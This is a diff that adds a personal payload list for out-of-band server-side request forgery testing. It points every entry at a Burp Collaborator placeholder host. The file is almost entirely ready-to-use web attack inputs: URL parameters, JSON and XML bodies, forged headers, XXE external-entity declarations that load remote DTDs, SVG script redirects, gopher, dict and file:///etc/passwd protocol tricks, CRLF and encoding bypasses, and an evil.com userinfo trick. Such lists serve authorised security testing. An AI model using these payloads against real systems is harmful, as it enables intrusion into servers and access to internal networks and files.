@@ -1,0 +1,110 @@
+# where I use burpcollaborator
+GET /fetch?url=http://YOUR-COLLABORATOR.burpcollaborator.net HTTP/1.1
+GET /proxy?endpoint=http://YOUR-COLLABORATOR.burpcollaborator.net
+GET /image?src=http://YOUR-COLLABORATOR.burpcollaborator.net
+GET /load?file=http://YOUR-COLLABORATOR.burpcollaborator.net
+GET /api/fetch?target=http://YOUR-COLLABORATOR.burpcollaborator.net
+GET /webhook?callback=http://YOUR-COLLABORATOR.burpcollaborator.net
+GET /import?url=http://YOUR-COLLABORATOR.burpcollaborator.net
+GET /download?source=http://YOUR-COLLABORATOR.burpcollaborator.net
+GET /scrape?website=http://YOUR-COLLABORATOR.burpcollaborator.net
+
+#========Request Body ==========
+{"url":"http://YOUR-COLLABORATOR.burpcollaborator.net"}
+{"endpoint":"http://YOUR-COLLABORATOR.burpcollaborator.net"}
+{"callback":"http://YOUR-COLLABORATOR.burpcollaborator.net"}
+{"webhook":"http://YOUR-COLLABORATOR.burpcollaborator.net"}
+
+<url>http://YOUR-COLLABORATOR.burpcollaborator.net</url>
+<endpoint>http://YOUR-COLLABORATOR.burpcollaborator.net</endpoint>
+<callback>http://YOUR-COLLABORATOR.burpcollaborator.net</callback>
+#======== Headers ===================
+X-Forwarded-For: http://YOUR-COLLABORATOR.burpcollaborator.net
+X-Forwarded-Host: YOUR-COLLABORATOR.burpcollaborator.net
+Referer: http://YOUR-COLLABORATOR.burpcollaborator.net
+Origin: http://YOUR-COLLABORATOR.burpcollaborator.net
+Host: YOUR-COLLABORATOR.burpcollaborator.net
+
+#=================== File Uploads ===========
+<?xml version="1.0"?>
+<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR.burpcollaborator.net"> %xxe;]>
+<svg xmlns="http://www.w3.org/2000/svg">
+    <image href="http://YOUR-COLLABORATOR.burpcollaborator.net"/>
+</svg>
+
+# ========== URL PARAMETERS ==========
+http://YOUR-COLLABORATOR.burpcollaborator.net
+https://YOUR-COLLABORATOR.burpcollaborator.net
+http://YOUR-COLLABORATOR.burpcollaborator.net/test
+http://YOUR-COLLABORATOR.burpcollaborator.net/callback
+http://YOUR-COLLABORATOR.burpcollaborator.net/ssrf
+http://YOUR-COLLABORATOR.burpcollaborator.net:8080
+http://YOUR-COLLABORATOR.burpcollaborator.net:8443
+
+# ========== WITH PATH TRAVERSAL ==========
+http://YOUR-COLLABORATOR.burpcollaborator.net/../test
+http://YOUR-COLLABORATOR.burpcollaborator.net/%2e%2e/test
+http://YOUR-COLLABORATOR.burpcollaborator.net/%252e%252e/test
+
+# ========== URL ENCODED ==========
+http://YOUR-COLLABORATOR.burpcollaborator.net%2ftest
+http://YOUR-COLLABORATOR.burpcollaborator.net%23test
+http://YOUR-COLLABORATOR.burpcollaborator.net%3Fq=test
+
+# ========== DIFFERENT PROTOCOLS ==========
+ftp://YOUR-COLLABORATOR.burpcollaborator.net:21
+gopher://YOUR-COLLABORATOR.burpcollaborator.net:8080
+dict://YOUR-COLLABORATOR.burpcollaborator.net:11211
+file://YOUR-COLLABORATOR.burpcollaborator.net/etc/passwd
+
+# ========== WITH PARAMETERS ==========
+http://YOUR-COLLABORATOR.burpcollaborator.net?param=1
+http://YOUR-COLLABORATOR.burpcollaborator.net?id=12345
+http://YOUR-COLLABORATOR.burpcollaborator.net?source=signup
+
+# ========== WITH AUTH ==========
+http://user@YOUR-COLLABORATOR.burpcollaborator.net
+http://YOUR-COLLABORATOR.burpcollaborator.net@evil.com
+http://YOUR-COLLABORATOR.burpcollaborator.net#fragment
+
+# ========== CRLF INJECTION ==========
+http://YOUR-COLLABORATOR.burpcollaborator.net%0d%0a
+http://YOUR-COLLABORATOR.burpcollaborator.net%0a
+http://YOUR-COLLABORATOR.burpcollaborator.net%09
+
+# ========== BLIND SSRF VIA JSON ==========
+{"url":"http://YOUR-COLLABORATOR.burpcollaborator.net"}
+{"endpoint":"http://YOUR-COLLABORATOR.burpcollaborator.net"}
+{"webhook":"http://YOUR-COLLABORATOR.burpcollaborator.net"}
+{"callback":"http://YOUR-COLLABORATOR.burpcollaborator.net"}
+
+# ========== BLIND SSRF VIA XML ==========
+<url>http://YOUR-COLLABORATOR.burpcollaborator.net</url>
+<endpoint>http://YOUR-COLLABORATOR.burpcollaborator.net</endpoint>
+<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR.burpcollaborator.net"> %xxe;]>
+
+# ========== BLIND SSRF VIA SVG ==========
+<svg><image href="http://YOUR-COLLABORATOR.burpcollaborator.net"/></svg>
+<svg><script>location.href='http://YOUR-COLLABORATOR.burpcollaborator.net'</script></svg>
+
+# ========== BLIND SSRF VIA HEADERS ==========
+X-Forwarded-For: http://YOUR-COLLABORATOR.burpcollaborator.net
+Referer: http://YOUR-COLLABORATOR.burpcollaborator.net
+Origin: http://YOUR-COLLABORATOR.burpcollaborator.net
+Host: YOUR-COLLABORATOR.burpcollaborator.net
+X-Forwarded-Host: YOUR-COLLABORATOR.burpcollaborator.net
+
+# ========== COMBINED WITH XXE ==========
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR.burpcollaborator.net/xxe"> %remote;]>
+<!DOCTYPE test [<!ENTITY % payload SYSTEM "http://YOUR-COLLABORATOR.burpcollaborator.net/payload"> %payload;]>
+
+# ========== WITH UNIQUE IDENTIFIERS ==========
+http://YOUR-COLLABORATOR.burpcollaborator.net?test=1
+http://YOUR-COLLABORATOR.burpcollaborator.net/callback/unique-id-123
+http://YOUR-COLLABORATOR.burpcollaborator.net/source/contact-form
+http://YOUR-COLLABORATOR.burpcollaborator.net/endpoint/api/user
+
+# ========== DNS ONLY (NO HTTP) ==========
+YOUR-COLLABORATOR.burpcollaborator.net
+http://YOUR-COLLABORATOR.burpcollaborator.net:53
+dns://YOUR-COLLABORATOR.burpcollaborator.net
